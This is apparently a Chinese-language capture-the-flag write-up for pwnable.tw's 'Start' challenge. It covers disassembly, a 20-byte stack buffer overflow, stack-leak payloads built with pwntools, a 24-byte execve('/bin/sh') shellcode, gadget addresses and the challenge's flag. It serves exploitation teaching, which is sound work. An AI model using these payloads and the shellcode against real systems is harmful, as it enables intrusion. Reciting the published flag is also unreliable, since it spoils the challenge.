---
tags:
  - stack-buffer-overflow
  - information-leak
  - shellcode
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: no
canary: no
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "在一个极简的 32 位汇编二进制中，利用栈缓冲区溢出通过 sys_write 泄漏栈指针，并返回到栈上的用户 shellcode。"
proof-of-concept: no
---

# Start — pwnable.tw（100 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10000`
>
> Flag：`FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

## 题目概况

一个手写的超小型 x86-32 汇编程序（`.text` 只有 67 字节）。它打印 `"Let's start the CTF:"`，从 stdin 最多读 60 字节到 20 字节的栈缓冲区，然后返回。没有 libc、没有任何保护 —— 在静态链接、未 strip 的 ELF 上直接使用系统调用。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled          # stack is RWX
  PIE:      No PIE
```

## 反汇编

整个二进制只有两个例程：

```asm
08048060 <_start>:
 8048060:  push   esp                    ; save original ESP on stack
 8048061:  push   0x804809d              ; push address of _exit (return addr)
 8048066:  xor    eax,eax                ; clear registers
 8048068:  xor    ebx,ebx
 804806a:  xor    ecx,ecx
 804806c:  xor    edx,edx
 804806e:  push   0x3a465443             ; push "CTF:" (5 pushes = 20 bytes)
 8048073:  push   0x20656874             ; push "the "
 8048078:  push   0x20747261             ; push "art "
 804807d:  push   0x74732073             ; push "s st"
 8048082:  push   0x2774654c             ; push "Let'"
 8048087:  mov    ecx,esp                ; ecx = buffer addr (ESP)
 8048089:  mov    dl,0x14                ; edx = 20 (count)
 804808b:  mov    bl,0x1                 ; ebx = 1 (stdout)
 804808d:  mov    al,0x4                 ; eax = 4 (sys_write)
 804808f:  int    0x80                   ; write(1, esp, 20) → prints message
 8048091:  xor    ebx,ebx               ; ebx = 0 (stdin)
 8048093:  mov    dl,0x3c                ; edx = 60 (count)
 8048095:  mov    al,0x3                 ; eax = 3 (sys_read)
 8048097:  int    0x80                   ; read(0, esp, 60) ← VULN: 60 > 20
 8048099:  add    esp,0x14               ; pop the 20-byte message buffer
 804809c:  ret                           ; return to [esp] (was _exit, now attacker-controlled)

0804809d <_exit>:
 804809d:  pop    esp                    ; restore original ESP
 804809e:  xor    eax,eax
 80480a0:  inc    eax                    ; eax = 1 (sys_exit)
 80480a1:  int    0x80                   ; exit(0)
```

### `read` 执行时（0x8048097）的栈布局

```python
         ESP →  [ "Let'" ]           ← message[0:4]   (overwritten by input)
         +0x04  [ "s st" ]           ← message[4:8]
         +0x08  [ "art " ]           ← message[8:12]
         +0x0c  [ "the " ]           ← message[12:16]
         +0x10  [ "CTF:" ]           ← message[16:20]
         +0x14  [ 0x0804809d ]       ← saved return addr (_exit) ← OVERWRITE TARGET
         +0x18  [ original ESP ]     ← pushed by `push esp` at 0x8048060
         +0x1c  [ argc ]             ← original stack from kernel
         ...    (more argv/envp)     ← up to 60-20=40 bytes past ret addr
```

## 漏洞

### V1 — 栈缓冲区溢出（20 字节缓冲区，读取 60 字节）

**根因：** `read(0, esp, 60)` 把 60 字节读入只有 20 字节消息区域的栈空间。剩余 40 字节越过消息区，溢出到**保存的返回地址**及其之后。

```asm
8048093:  mov    dl,0x3c         ; read up to 60 bytes
8048095:  mov    al,0x3          ; sys_read
8048097:  int    0x80            ; read(stdin, esp, 60)
8048099:  add    esp,0x14        ; skip 20-byte message
804809c:  ret                    ; return to whatever is now at [esp]
```

**攻击者可控内容：** 第 20-23 字节覆写返回地址。第 24-59 字节落在返回地址之后的栈上。

**生效条件：**
- **NX 关闭** → 栈可执行，shellcode 直接运行
- **ASLR 开启** → 栈地址随机化，需要泄漏
- **无 canary** → 覆写返回地址毫无难度
- **程序开头 `push esp`** → 原始 ESP 值被存在栈上偏移 `+0x18` 处，正好在返回地址之后 4 字节

## 利用路径

全部 339 份解法本质上使用同样的两阶段思路，差异很小（不同的返回 gadget、shellcode 风格、NOP 雪橇长度）。

---

### 路径 A — 返回 `0x8048087` → 泄漏栈 → shellcode（标准做法）

**使用范围：** 约 95% 的解法（例如 100、114、1045、1172、1220、1251、1269、1297、1335、10068、10115、10295、10302、11543、12138、12649、13367、13484、14370、15989、exp.py）

这是最经典的解法，与服务端进行两次交互：

**阶段 1 —— 泄漏栈地址：**

```python
payload1 = b"A" * 20 + p32(0x08048087)
```

把返回地址覆写为 `0x08048087`（`mov ecx, esp`）。当 `0x804809c` 处的 `ret` 执行时：
1. `add esp, 0x14` 弹出 20 字节消息 → ESP 现在指向被覆写的返回地址槽。
2. `ret` 跳到 `0x08048087`。
3. 在 `0x08048087`：`mov ecx, esp` → ECX = 当前 ESP。
4. `write(1, esp, 20)` 从栈上打印 20 字节。**前 4 字节**就是**原始 ESP** 值（由 `0x8048060` 的 `push esp` 压入）。
5. `read(0, esp, 60)` 给我们第二次输入机会。

```python
leaked_esp = u32(recv(4))  # original ESP from the stack
```

**阶段 2 —— 跳到 shellcode：**

```python
shellcode_addr = leaked_esp + 0x14  # shellcode lands 20 bytes after ESP
payload2 = b"A" * 20 + p32(shellcode_addr) + shellcode
```

20 字节填充填满消息缓冲区，`p32(shellcode_addr)` 覆写返回地址，shellcode 紧随其后。`ret` 触发时，执行跳到栈上的 shellcode。

**Shellcode：** 几乎都是 `execve("/bin/sh", NULL, NULL)` —— 通常 21-28 字节，存在很多变体：

```asm
; 24-byte execve("/bin/sh") — most common variant
xor    eax, eax
push   eax
push   0x68732f2f    ; "//sh"
push   0x6e69622f    ; "/bin"
mov    ebx, esp      ; ebx = "/bin//sh"
xor    ecx, ecx
mov    edx, ecx      ; ecx = edx = NULL
mov    al, 0xb       ; sys_execve
int    0x80
```

---

### 路径 B — 返回 `0x0804808b` → 泄漏栈（位置偏移）→ 返回地址之前放 shellcode

**使用范围：** 解法 138（Ruby）、170

返回 `0x804808b` 而不是 `0x8048087`。区别在于：从 `0x804808b` 进入会跳过 `mov ecx, esp` 和 `mov dl, 0x14`，因此 **ECX 保留之前的值**（仍指向消息区），**BL 被设为 1**，但 **DL 保持旧值**（上一次 write 的 0x14）。这样仍写出 20 字节，但起始栈位置不同 —— 泄漏的 ESP 值出现在输出的不同偏移处（第 24 字节而非第 0 字节）。

```python
payload1 = b"a" * 20 + p32(0x0804808b)
# ... recv 24 bytes, then 4 bytes = leaked ESP
```

阶段 2 中，shellcode 放在返回地址**之前**（即 20 字节填充区），返回地址向后指：

```python
payload2 = shellcode.ljust(44, b"a") + p32(leaked_stack - 0x1c)
```

---

### 路径 C — 返回 `0x08048060`（`_start`）→ 重新运行 → 走标准泄漏

**使用范围：** 解法 10128

三阶段变体：第一次溢出返回 `_start`（0x8048060），完整重跑程序。第二次运行再用标准的路径 A。多了一次往返，但逻辑上更干净。

```python
# Stage 1: restart the program
payload1 = cyclic(20) + p32(0x8048060)
# Stage 2: leak (same as Path A stage 1)
payload2 = cyclic(20) + p32(0x8048087)
# Stage 3: shellcode (same as Path A stage 2)
payload3 = cyclic(20) + p32(leaked_esp + 20) + shellcode
```

---

### 路径 D — NOP 雪橇变体

**使用范围：** 解法 1220、11540、12138、12649、1236

与路径 A 相同的两阶段思路，但在 shellcode 前加 NOP 雪橇（`\x90`）提高可靠性：

```python
payload2 = b"\x90" * 20 + p32(leaked_esp + 20) + b"\x90" * N + shellcode
```

有些解法在多个栈槽重复填入返回地址（例如 `p32(addr) * 6`），提高命中正确偏移的概率。

---

### 路径 E — shellcode 摆放位置变体

少数解法把 shellcode 放在 20 字节填充区（返回地址之前）而不是之后：

```python
# Shellcode in padding, return address points to it
payload2 = shellcode.ljust(20, b"\x90") + p32(leaked_esp - offset)
```

只要 shellcode 足够短（≤20 字节）就可行，需要根据泄漏的栈地址算出正确的向后偏移。

## 利用原语汇总

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| 返回地址覆写 | V1：向 20 字节缓冲区读 60 字节 | 确定性 |
| 栈地址泄漏 | 返回 `0x8048087`（write gadget） | 确定性 |
| shellcode 执行 | NX 关闭，栈为 RWX | 确定性 |
| `execve("/bin/sh")` | 21-28 字节内联 shellcode | 确定性 |

## 关键地址

```python
_start         = 0x08048060  # program entry
write_gadget   = 0x08048087  # mov ecx,esp; write(1,esp,20); read(0,esp,60)
write_no_ecx   = 0x0804808b  # mov bl,1; write(1,ecx,20); read(0,esp,60)
read_syscall   = 0x08048091  # xor ebx; read(0,esp,60)
add_esp_ret    = 0x08048099  # add esp,0x14; ret
_exit          = 0x0804809d  # pop esp; exit(1)
```

## 解法 writeup

共有 339 份解法，几乎都走路径 A。代表性样本：

| 文件 | 思路 | 语言 | 说明 |
|------|----------|----------|-------|
| `exp.py` | A | Python（原始 socket） | 参考 exploit，不用 pwntools |
| `100.md` | A | Python（pwntools） | 极简、干净 |
| `114.md` | A | Python（pwntools） | 文字解释较好 |
| `138.md` | B（Ruby） | Ruby | 返回 `0x804808b`；少见的 Ruby 解法 |
| `170.md` | B | Python（pwntools） | 返回 `0x804808b`，shellcode 在返回地址之前 |
| `1045.md` | A | Python（pwntools） | 使用 `shellcraft.execve` |
| `1316.md` | A | Go | 唯一的 Go 语言解法 |
| `10128.md` | C | Python（pwntools） | 通过 `_start` 重入的三阶段 |
| `10178.md` | E | Python（pwntools） | shellcode 在返回地址之前 |
| `10295.md` | A | Python（pwntools） | 详细的栈结构图解释 |
| `11543.md` | A | Python（pwntools） | 韩文；简洁 |
| `13889.md` | A | Python（原始 socket） | 最详细的 writeup，附反汇编注释 |
| `14370.md` | A | Python（原始 socket） | 教学式讲解，条理清晰 |
| `15989.md` | A | Python（pwntools） | 干净简短 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用的 exploit 脚本（原始 socket，不用 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/start` | 原始题目二进制（ELF 32 位，静态链接） |
| `solution/*.md` | 社区 writeup（339 份解法） |
